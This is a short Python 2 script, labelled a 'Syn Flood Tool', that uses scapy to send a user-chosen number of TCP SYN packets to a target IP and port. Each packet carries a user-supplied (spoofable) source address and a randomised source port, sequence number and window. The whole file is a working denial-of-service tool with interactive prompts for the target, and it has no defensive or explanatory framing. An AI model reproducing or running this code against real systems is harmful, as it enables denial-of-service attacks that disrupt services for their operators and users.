#!/usr/bin/python
# Emre Ovunc
# info@emreovunc.com
# Syn Flood Tool Python

from scapy.all import *
import os
import sys
import random

def randInt():
    x = random.randint(1000,9000)
    return x    

def SYN_Flood(srcIP,dstIP,dstPort,counter):
    total = 0
    print "Packets are sending ..."
    for x in range (0,counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP ()
        IP_Packet.src = srcIP
        IP_Packet.dst = dstIP

        TCP_Packet = TCP () 
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet/TCP_Packet, verbose=1)
        total+=1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


def info():
    os.system("clear")
    print "#############################"
    print "#    github.com/EmreOvunc   #"
    print "#############################"
    print "# Welcome to SYN Flood Tool #"
    print "#############################"

    srcIP = raw_input("\nSrc IP : ")
    dstIP = raw_input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")
    
    return srcIP,dstIP,int(dstPort)
    

def main():
    srcIP,dstIP,dstPort = info()
    counter = input ("How many packets do you want to send : ")
    SYN_Flood(srcIP,dstIP,dstPort,int(counter))

main()
